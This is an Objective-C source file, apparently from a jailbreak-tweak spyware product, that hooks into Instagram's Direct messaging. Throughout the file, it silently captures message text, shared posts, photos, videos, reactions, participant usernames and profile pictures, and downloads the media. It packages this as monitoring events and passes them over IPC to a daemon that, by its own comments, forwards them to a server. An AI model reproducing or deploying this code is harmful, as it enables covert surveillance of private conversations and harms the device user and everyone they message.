//
//  IGUtils.m
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 7/11/2559 BE.
//
//

#import "IGUtils.h"

//Instagram Header

#import "IGDirectInboxNetworker.h"
#import "IGDirectThread.h"
#import "IGDirectThreadStore.h"
#import "IGDirectThreadStore-Networking.h"
#import "IGDirectThreadsFetchOptions.h"
#import "IGDirectContent.h"
#import "IGDirectComment.h"
#import "IGDirectPhoto.h"
#import "IGDirectVideo.h"
#import "IGDirectReaction.h"
#import "IGDirectPostShare.h"
#import "IGPost.h"
#import "IGFeedItem.h"

//Media
#import "IGPhoto.h"
#import "IGVideo.h"
#import "IGHeartView.h"

#import "IGDate.h"
#import "IGStorableObject.h"
#import "IGUser.h"
#import "IGAuthHelper.h"
#import "IGAuthHelper+8-3-0.h"
#import "IGUserSession.h"
#import "IGImageLoader.h"
#import "IGColors.h"

#import "FxIMEvent.h"
#import "FxEventEnums.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import "IMShareUtils.h"
#import "StringUtils.h"
#import "DefStd.h"
#import "SharedFile2IPCSender.h"
#import "MessagePortIPCSender.h"

#import <objc/runtime.h>

static IGUtils *_IGUtils = nil;

@implementation IGUtils

#pragma mark - Shared Instance -

+ (IGUtils *) sharedIGUtils {
    if (_IGUtils == nil) {
        _IGUtils = [[IGUtils alloc] init];
        
        SharedFile2IPCSender *sharedFileSender = nil;
        
        sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kInstagramMessagePort1];
        [_IGUtils setMIMSharedFileSender:sharedFileSender];
        [sharedFileSender release];
        sharedFileSender = nil;

    }
    return (_IGUtils);
}

#pragma mark - Observer App did become active

- (void)registerForAppDidBecomeActive{
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(captureOfflineMessageInNewThread)
                                                 name:UIApplicationDidBecomeActiveNotification object:nil];
}

- (void)unregisterForAppDidBecomeActive {
    [[NSNotificationCenter defaultCenter] removeObserver:self];
}

#pragma mark - Capture Util -

- (void)captureOfflineMessageInNewThread
{
    DLog(@"AppDidBecomeActive Start Capturing Offline Message");
    [NSThread detachNewThreadSelector:@selector(captureOfflineMessage) toTarget:self withObject:nil];
}

- (void)captureOfflineMessage
{
    DLog(@"----captureOfflineMessage----");
    @try {
        Class $IGDirectInboxNetworker = objc_getClass("IGDirectInboxNetworker");
        IGDirectInboxNetworker *inboxNetworker = [$IGDirectInboxNetworker sharedNetworker];
        IGDirectThreadStore *threadStore = inboxNetworker.threadStore;
        
        [inboxNetworker fetchInboxDataFromFirstPage:YES success:^(id arg1){
            DLog(@"success arg1 %@", arg1);
            
            Class $IGDirectThreadsFetchOptions = objc_getClass("IGDirectThreadsFetchOptions");
            IGDirectThreadsFetchOptions *option = [[$IGDirectThreadsFetchOptions alloc] init];
            option.includeLocalThreads = YES;
            option.isPending = NO;
            
            NSOrderedSet *threads = [threadStore threadsWithOptions:option];

            NSArray *sortedThreads = [threads sortedArrayUsingComparator:^NSComparisonResult(IGDirectThread *thread1, IGDirectThread *thread2) {
                @try {
                    [thread1 lastItemAt];
                    IGDirectContent *lastestMessage1 = [thread1.publishedMessages lastObject];
                    IGDate *lastestMessageDate1 = lastestMessage1.sentAt;
                    
                    IGDirectContent *lastestMessage2 = [thread2.publishedMessages lastObject];
                    IGDate *lastestMessageDate2 = lastestMessage2.sentAt;
                    
                    return [lastestMessageDate1.date compare:lastestMessageDate2.date];
                } @catch (NSException *exception) {
                    DLog(@"Found exception %@", exception);
                } @finally {
                    //DLog(@"Done");
                }
            }];
            
            [sortedThreads enumerateObjectsUsingBlock:^(IGDirectThread *thread, NSUInteger idx, BOOL * _Nonnull stop) {
                DLog(@"thread %@", thread);
                DLog(@"thread publishedMessages %@", thread.publishedMessages);
                
                IGDirectContent *lastestMessage = [thread.publishedMessages lastObject];
                IGDate *lastestMessageDate = lastestMessage.sentAt;
                DLog(@"lastestMessageDate %@", lastestMessageDate);
                
                NSNumber *lastestTimestampObject = [self.mLastestThreadTimestampDic objectForKey:thread.threadId];
                if (!lastestTimestampObject) {// For firstime capture offline message
                    lastestTimestampObject = [NSNumber numberWithDouble:[[NSDate date] timeIntervalSince1970]];
                    [self storeLastestThreadTimeStamp:[lastestTimestampObject doubleValue] forThreadID:thread.threadId];
                }
                
                double lastestTimestamp = [lastestTimestampObject doubleValue];
                DLog(@"lastestTimestamp %f", lastestTimestamp);
            
                //Filter by lastest timestamp of thread that we keep in plist
                if (lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
                    NSArray *lastSeenItems = [[thread.lastSeenAtForItemIds allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                        return [obj1.date compare:obj2.date];
                    }];
                    
                    DLog(@"lastSeenItems %@", lastSeenItems);
                    IGDate *lastSeenDate = [lastSeenItems lastObject];

                    IGDirectContent *firstMessage = [thread.publishedMessages firstObject];
                    DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
                    
                    if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                        //Need to load more message
                        [self loadAllContentFromThread:thread inThreadStore:threadStore firstLoad:YES];
                    }
                    else {
                        //Do capture
                        [self captureMessagesFromThread:thread];
                    }
                }

            }];
        }
        failure:nil];
    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        //DLog(@"Done");
    }
}

- (void)loadAllContentFromThread:(IGDirectThread *)aThread inThreadStore:(IGDirectThreadStore *)aThreadStore firstLoad:(BOOL)isFirstLoad
{
    @try {
        NSNumber *cursorOption = @0;
        NSNumber *mergeOption = @2;
        NSString *cursorValue = nil;
        
        DLog(@"thread %@", aThread);
        DLog(@"thread.hasOlder %d", aThread.hasOlder);
        
        if (!isFirstLoad) {
            cursorOption = @2;
            cursorValue = aThread.oldestCursor;
            DLog(@"cursorValue %@", cursorValue);
        }
        
        [aThreadStore fetchThreadWithID:aThread.threadId cursorOption:cursorOption cursorValue:cursorValue mergeOption:mergeOption successfulThreadHandler:^(IGDirectThread *resultThread){
            DLog(@"success arg1 %@", resultThread);
            DLog(@"resultThread.publishedMessages %@", resultThread.publishedMessages);
            
            __block BOOL haveOlderUnseenItem = NO;
            
            NSArray *lastSeenItems = [[resultThread.lastSeenAtForItemIds allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                return [obj1.date compare:obj2.date];
            }];
            
            DLog(@"lastSeenItems %@", lastSeenItems);
            IGDate *lastSeenDate = [lastSeenItems lastObject];
            
            IGDirectContent *firstMessage = [resultThread.publishedMessages firstObject];
            DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
            
            if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                haveOlderUnseenItem = YES;
            }
            
            if (haveOlderUnseenItem) {
                //Need to load more message
                DLog(@"Load More");
                [self loadAllContentFromThread:resultThread inThreadStore:aThreadStore firstLoad:NO];
            }
            else {
                //Do capture here
                [self captureMessagesFromThread:resultThread];
            }
        } failureHandler:^(id arg1){
            DLog(@"fail arg1 %@", arg1);
        }];
    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        DLog(@"Done");
    }
}

- (void)captureMessagesFromThread:(IGDirectThread *)aThread
{
    NSArray *sortedMessageArray = [aThread.publishedMessages sortedArrayUsingComparator:^NSComparisonResult(IGDirectContent *content1, IGDirectContent *content2) {
        return [content1.sentAt.date compare:content2.sentAt.date];
    }];
    
    NSMutableArray *shouldCaptureArray = [NSMutableArray array];
    
    double lastestTimestamp = [[self.mLastestThreadTimestampDic objectForKey:aThread.threadId] doubleValue];
    DLog(@"lastestTimestamp %f", lastestTimestamp);
    
    [sortedMessageArray enumerateObjectsUsingBlock:^(IGDirectContent *content, NSUInteger idx, BOOL * _Nonnull stop) {
        Class $IGDirectComment = objc_getClass("IGDirectComment");
        Class $IGDirectPhoto = objc_getClass("IGDirectPhoto");
        Class $IGDirectVideo = objc_getClass("IGDirectVideo");
        Class $IGDirectReaction = objc_getClass("IGDirectReaction");
        Class $IGDirectPostShare = objc_getClass("IGDirectPostShare");
        
        if ([content isKindOfClass:$IGDirectComment] ||
            [content isKindOfClass:$IGDirectPhoto] ||
            [content isKindOfClass:$IGDirectVideo] ||
            [content isKindOfClass:$IGDirectReaction]||
            [content isKindOfClass:$IGDirectPostShare]) {
            
            DLog(@"content %@", content);
            DLog(@"content.sentAt.timeIntervalSince1970 %f", content.sentAt.timeIntervalSince1970);
            
            if (content.sentAt.timeIntervalSince1970 > lastestTimestamp) {
                [shouldCaptureArray addObject:content];
            }
        }
        else {
            DLog(@"Not support capturing this class %@", [content class]);
        }
    }];
    
    [shouldCaptureArray enumerateObjectsUsingBlock:^(IGDirectContent *content, NSUInteger idx, BOOL * _Nonnull stop) {
        [IGUtils captureMessageContent:content inThread:aThread];
    }];
    
    //Save lastest time stamp after filter message for capture
    IGDirectContent *lastestMessage = [sortedMessageArray lastObject];
    IGDate *lastestMessageDate = lastestMessage.sentAt;
    [self storeLastestThreadTimeStamp:lastestMessageDate.timeIntervalSince1970 forThreadID:aThread.threadId];
}

+ (void)captureMessageContent:(IGDirectContent *)aContent inThread:(IGDirectThread *)aThread
{
    DLog(@"Captured Content %@", aContent);
    DLog(@"inThread %@", aThread);
    
    @try {
        DLog(@"Send Instagram Direct message");
 
        NSMutableDictionary *IGDictionary = [NSMutableDictionary dictionary];
        
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageText;
        NSString *message = nil;
        
        Class $IGDirectComment = objc_getClass("IGDirectComment");
        Class $IGDirectPhoto = objc_getClass("IGDirectPhoto");
        Class $IGDirectVideo = objc_getClass("IGDirectVideo");
        Class $IGDirectReaction = objc_getClass("IGDirectReaction");
        Class $IGDirectPostShare = objc_getClass("IGDirectPostShare");
        
        if ([aContent isKindOfClass:$IGDirectComment]) {
            messageRepresentation = kIMMessageText;
            
            IGDirectComment *directComment = aContent;
            message = directComment.text;
        }
        else if ([aContent isKindOfClass:$IGDirectPostShare]) {
            messageRepresentation = kIMMessageText;
            
            IGDirectPostShare *directPostShare = aContent;
            IGFeedItem *post = directPostShare.post;
            message = post.permalink;
        }
        else if ([aContent isKindOfClass:$IGDirectPhoto]) {
            messageRepresentation = kIMMessageNone;
        }
        else if ([aContent isKindOfClass:$IGDirectVideo]) {
            messageRepresentation = kIMMessageNone;
        }
        else if ([aContent isKindOfClass:$IGDirectReaction]) {
            messageRepresentation = kIMMessageSticker;
        }
        
        if (aContent.senderIsCurrentUser) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
        IGUser *sender = aContent.user;
        DLog(@"pageID %@", sender.pageID);
        DLog(@"pk %@", sender.pk);
        
        // -- get UID ------------------------------------------------------------
        NSString *senderUID             = [NSString stringWithString:sender.pk];             // -- Target    - UID
        
        // -- get Display Name  ------------------------------------------------------------
        NSString *senderDisplayName     = [NSString stringWithString:sender.username];     // -- Target    - Display Name
        
        // -- get ShortDisplay Name  ------------------------------------------------------------
        //NSString *senderShortDisplayName     = [NSString stringWithString:sender.displayName];     // -- Target    - Display Name
        
        // -- get Text ------------------------------------------------------------
        //NSString *textMessage           = [NSString stringWithString:anItem.message];                                         // -- Message Text
        //DLog(@"-- Text message:   %@", textMessage);
        
        
        // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = [NSString stringWithString:aThread.threadId];       // -- Conversation ID
        NSString *converName             = [NSString stringWithString:aThread.name];       // -- Conversation ID
        
        DLog(@"converName %@", converName)
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary = [NSMutableDictionary dictionary];
        
        NSArray *allUserInthread = aThread.users;
        DLog(@"all user in thread %@", allUserInthread);
        
        [allUserInthread enumerateObjectsUsingBlock:^(IGUser *user, NSUInteger idx, BOOL * _Nonnull stop) {
            //Filter out sender
            if (![user.pk isEqualToString:sender.pk]) {
                FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:user.pk]
                                                                      displayname: user.username
                                                                    statusMessage: @""
                                                                   pictureProfile:nil];
                [participants addObject:participant];
                [participantProfileDictionary setObject:[user.profilePicURL absoluteString] forKey:user.pk];
            }
        }];
        
        if (messgageDirection == kEventDirectionIn) {
            Class $IGAuthHelper = objc_getClass("IGAuthHelper");
            IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
            IGUserSession *currentUserSession = authHelper.currentUserSession;
            IGUser *currentUser = currentUserSession.user;
            DLog(@"currentUser %@", currentUser);
            
            FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:currentUser.pk]
                                                                  displayname: currentUser.username
                                                                statusMessage: @""
                                                               pictureProfile:nil];
            
            [participants insertObject:participant atIndex:0];
            [participantProfileDictionary setObject:[currentUser.profilePicURL absoluteString] forKey:currentUser.pk];
        }
        
        [IGDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        
        
        NSMutableArray *attachmentArray = [NSMutableArray array];
        
        //Profile Picture Data
        if ([sender.profilePicURL absoluteString].length > 0) {
            [IGDictionary setObject:[NSString stringWithString:[sender.profilePicURL absoluteString]] forKey:@"ProfilePictureURL"];
        }
        
        if ([aContent isKindOfClass:$IGDirectPhoto]) {
            IGDirectPhoto *photoContent = aContent;
            IGPhoto *photo = photoContent.photo;
            DLog(@"photo %@", photo);
            DLog(@"previewImageData %@", photo.previewImageData);
            
            //DLog(@"imageVersions %@", photo.imageVersions);
            
            if (photo.imageVersions.count > 0) {
                NSDictionary *versionDictionary = [photo.imageVersions objectAtIndex:0];
                DLog(@"versionDictionary %@", versionDictionary);
                NSString *photoURL = [versionDictionary objectForKey:@"url"];
                DLog(@"photoURL %@", photoURL);
                [IGDictionary setObject:[photoURL stringByAppendingString:@".png"] forKey:@"AttachmentURL"];
            }
            
        }
        
        if ([aContent isKindOfClass:$IGDirectVideo]) {
            IGDirectVideo *videoContent = aContent;
            IGVideo *video = videoContent.video;
            DLog(@"video %@", video);
            DLog(@"allVideoURLs %@", video.allVideoURLs);
            
            if (video.allVideoURLs.count > 0) {
                id videoURL = [[video.allVideoURLs allObjects] objectAtIndex:0];
                DLog(@"videoURL %@", videoURL);
                [IGDictionary setObject:[videoURL absoluteString] forKey:@"AttachmentURL"];
            }
            
            IGPhoto *thumbnailPhoto = videoContent.photo;
            DLog(@"photo %@", thumbnailPhoto);
            
            if (thumbnailPhoto.imageVersions.count > 0) {
                NSDictionary *versionDictionary = [thumbnailPhoto.imageVersions objectAtIndex:0];
                DLog(@"versionDictionary %@", versionDictionary);
                NSString *photoURL = [versionDictionary objectForKey:@"url"];
                DLog(@"photoURL %@", photoURL);
                [IGDictionary setObject:[photoURL stringByAppendingString:@".png"] forKey:@"thumbnailURL"];
            }
        }
        
        if ([aContent isKindOfClass:$IGDirectReaction]) {
            IGDirectReaction *reactionContent = aContent;
            DLog(@"reactionContent.type %llu", reactionContent.type);
            
            if (reactionContent.type == 1) {//Like reaction
                Class $IGImageLoader = objc_getClass("IGImageLoader");
                Class $IGColors = objc_getClass("IGColors");
                
                DLog(@"tintedImageCache %@", [$IGImageLoader tintedImageCache]);
                NSData *heartImageData = UIImagePNGRepresentation([$IGImageLoader tintedImageWithName:@"direct-heart" tintColor:[$IGColors heartColor]]);
                FxAttachment *attachment = [[FxAttachment alloc] init];
                [attachment setMThumbnail:heartImageData];
                [attachmentArray addObject:attachment];
                [attachment release];
            }
            else {
                DLog(@"New kind of Reaction");
            }
        }
        
        // ------------------- FXIMEvent Construction ------------------------
        
        FxIMEvent *imEvent      = [IGUtils createFXIMEventForMessageDirection: messgageDirection
                                                                         representation: messageRepresentation
                                                                                message: message
                                                                                 userID: senderUID                 // sender id
                                                                        userDisplayName: senderDisplayName         // sender display name
                                                                      userStatusMessage: @""       // sender status message
                                                                            userPicture: nil
                                                                               converID: converID
                                                                             converName: converName
                                                                          converPicture: nil
                                                                           participants: participants
                                                                            attachments: attachmentArray];
        [[IGUtils sharedIGUtils] sendIGEvent:imEvent withIGDictionary:IGDictionary];
    }
    @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark - Create FXEvent before sending to server

+ (FxIMEvent *) createFXIMEventForMessageDirection: (FxEventDirection) aDirection
                                    representation: (FxIMMessageRepresentation) aRepresentation
                                           message: (NSString *) aMessage
                                            userID: (NSString *) aUserID
                                   userDisplayName: (NSString *) aUserDisplayname
                                 userStatusMessage: (NSString *) aUserStatusMessage
                                       userPicture: (NSData *) aUserPic
                                          converID: (NSString *) aConverID
                                        converName: (NSString *) aConverName
                                     converPicture: (NSData *) aConverPic
                                      participants: (NSArray *) aParticipaints
                                       attachments: (NSArray *) aAttachments {
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:@"ig"];
    [imEvent setMServiceID: kIMServiceInstagram];
    
    
    [imEvent setMDirection: aDirection];
    [imEvent setMRepresentationOfMessage: aRepresentation];
    [imEvent setMMessage: aMessage];
    
    // user (sender)
    [imEvent setMUserID: aUserID];
    [imEvent setMUserDisplayName: aUserDisplayname];
    [imEvent setMUserStatusMessage: aUserStatusMessage];
    [imEvent setMUserPicture: aUserPic];// sender image profile
    [imEvent setMUserLocation: nil];
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aConverName];
    [imEvent setMConversationPicture:aConverPic];
    
    // participant
    [imEvent setMParticipants:aParticipaints];
    
    // share location
    [imEvent setMShareLocation:nil];
    
    [imEvent setMAttachments:aAttachments];
    DLog(@"Instagram Direct Message  %@", imEvent);
    
    return [imEvent autorelease];
}

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname
                                  statusMessage: (NSString *) aStatusMessage
                                 pictureProfile: (NSData *) aPictureProfile {
    FxRecipient *participant = [[FxRecipient alloc] init];
    [participant setRecipNumAddr:aUserID];
    [participant setRecipContactName:aUserDisplayname];
    [participant setMStatusMessage:aStatusMessage];
    [participant setMPicture:aPictureProfile];
    return [participant autorelease];
}

#pragma mark - Send event thread method -

- (void) sendIGEvent: (FxIMEvent *) aIMEvent withIGDictionary:(NSDictionary *)anIGDictionary;
{
    //DLog(@"Sending Event");
    NSArray *extraArgs  = [[NSArray alloc] initWithObjects:aIMEvent, anIGDictionary, nil];
    [NSThread detachNewThreadSelector:@selector(threadSendIGEvent:) toTarget:self withObject:extraArgs];
    
    [extraArgs release];
}

- (void) threadSendIGEvent: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        NSDictionary *IGDictionary = [aArgs objectAtIndex:1];
        
        //Download Profile Picture Data
        NSString *profilePictureURL = IGDictionary[@"ProfilePictureURL"];
        if (profilePictureURL.length > 0) {
            NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
            [imEvent setMUserPicture:profilePictureData];
            DLog(@"Download Profile Picture Data %@", profilePictureURL);
        }
        
        //Download Participant Profile Picture Data
        NSArray *participantArray = imEvent.mParticipants;
        NSDictionary *profileDic = IGDictionary[@"ParticipantProfileDic"];
        [participantArray enumerateObjectsUsingBlock:^(FxRecipient *participant, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            
            if ([profileDic objectForKey:participant.recipNumAddr]) {
                NSString *profilePictureURL = [profileDic objectForKey:participant.recipNumAddr];
                
                if (profilePictureURL.length > 0) {
                    DLog(@"Download Participant Profile Picture Data %@", profilePictureURL);
                    NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
                    [participant setMPicture:profilePictureData];
                }
            }
        }];
        
        NSString *attachmentURL = IGDictionary[@"AttachmentURL"];
        NSString *thumbnailURL = IGDictionary[@"thumbnailURL"];
        if (attachmentURL.length > 0) {
            FxAttachment *attachment = [[FxAttachment alloc] init];
            NSString *IGAttachmentPath = nil;
            NSMutableArray *attachmentArray = [NSMutableArray array];
            NSData *mediaData = [NSData dataWithContentsOfURL:[NSURL URLWithString:attachmentURL]];
            //DLog(@"Media URL %@", originalUrl);
            if (mediaData) {
                IGAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imInstagram/"];
                IGAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", IGAttachmentPath, [[NSDate date] timeIntervalSince1970], attachmentURL.lastPathComponent];
                
                if (![mediaData writeToFile:IGAttachmentPath atomically:YES]) {
                    // iOS 9, Sandbox
                    IGAttachmentPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imInstagram/" fileName:[IGAttachmentPath lastPathComponent]];
                }
            } else {
                IGAttachmentPath = @"image/jpg";
            }
            
            [attachment setFullPath:IGAttachmentPath];
            
            if (thumbnailURL.length > 0) {
                NSData *thumbnailData = [NSData dataWithContentsOfURL:[NSURL URLWithString:thumbnailURL]];
                [attachment setMThumbnail:thumbnailData];
            }
            else {
                [attachment setMThumbnail:nil];
            }
            
            [attachmentArray addObject:attachment];
            [attachment release];
            
            [imEvent setMAttachments:attachmentArray];
        }

        if (imEvent) {
            DLog(@"Sending Event %@", imEvent);
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
            DLog(@"Instagram direct message after remove emoji = %@", msg);
            
            if ([msg length] || [[imEvent mAttachments] count]) {
                [imEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
                [archiver encodeObject:imEvent forKey:kInstagramArchived];
                [archiver finishEncoding];
                [archiver release];
                
                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kInstagramMessagePort1];
                //DLog (@"Sending to first port %d", isSendingOK);
                
                if (!isSendingOK) {
                    DLog (@"First sending Instagram direct message fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kInstagramMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Instagram direct message also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kInstagramMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Instagram direct message also fail, so delete the attachment");
                            [IGUtils deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
        } // aIMEvent
    }
    @catch (NSException *exception){
        DLog(@"Found Exception %@", exception);
    }
    @finally {
        ;
    }
    [pool release];
}

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
    BOOL successfully = FALSE;
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
        MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
        successfully                            = [messagePortSender writeDataToPort:aData];
        [messagePortSender release];
        messagePortSender = nil;
    } else {
        SharedFile2IPCSender *sharedFileSender  = self.mIMSharedFileSender;
        DLog(@"sharedFileSender %@", sharedFileSender)
        successfully = [sharedFileSender writeDataToSharedFile:aData];
    }
    return (successfully);
}


#pragma mark - General Utils -

- (void)initialize
{
    [_IGUtils registerForAppDidBecomeActive];
    [_IGUtils restoreLastestThreadTimeStampDic];
}

- (void) storeLastestThreadTimeStamp: (double)aLastestTimeStamp forThreadID:(NSString *)aThreadID
{
    if (aLastestTimeStamp && aThreadID) {
        [self.mLastestThreadTimestampDic setObject:[NSNumber numberWithDouble:aLastestTimeStamp] forKey:aThreadID];
        
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *basePath = paths.firstObject;
        NSString *filePath = [basePath stringByAppendingString:@"/lastestTimestamp.plist"];
        [self.mLastestThreadTimestampDic writeToFile:filePath atomically:YES];
    }
}

- (void) restoreLastestThreadTimeStampDic {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *basePath = paths.firstObject;
    NSString *filePath = [basePath stringByAppendingString:@"/lastestTimestamp.plist"];
    NSDictionary *lastestTimeStampInfo = [NSDictionary dictionaryWithContentsOfFile:filePath];
    if (lastestTimeStampInfo) {
        self.mLastestThreadTimestampDic = [NSMutableDictionary dictionaryWithDictionary:lastestTimeStampInfo];
    } else {
        self.mLastestThreadTimestampDic = [NSMutableDictionary dictionary];
    }
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
    // delete the attachment files
    if (aAttachmentArray && [aAttachmentArray count] != 0) {
        for (FxAttachment *attachment in aAttachmentArray) {
            NSString *path = [attachment fullPath];
            //DLog (@"deleting Instagram attachment file: %@", path);
            [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
        }
    }
}


#pragma mark - Dealloc - 

- (void)dealloc
{
    [self unregisterForAppDidBecomeActive];
    
    [self.mLastestThreadTimestampDic release];
    self.mLastestThreadTimestampDic = nil;
    
    [self.mIMSharedFileSender release];
    self.mIMSharedFileSender = nil;
    
    [super dealloc];
}

@end
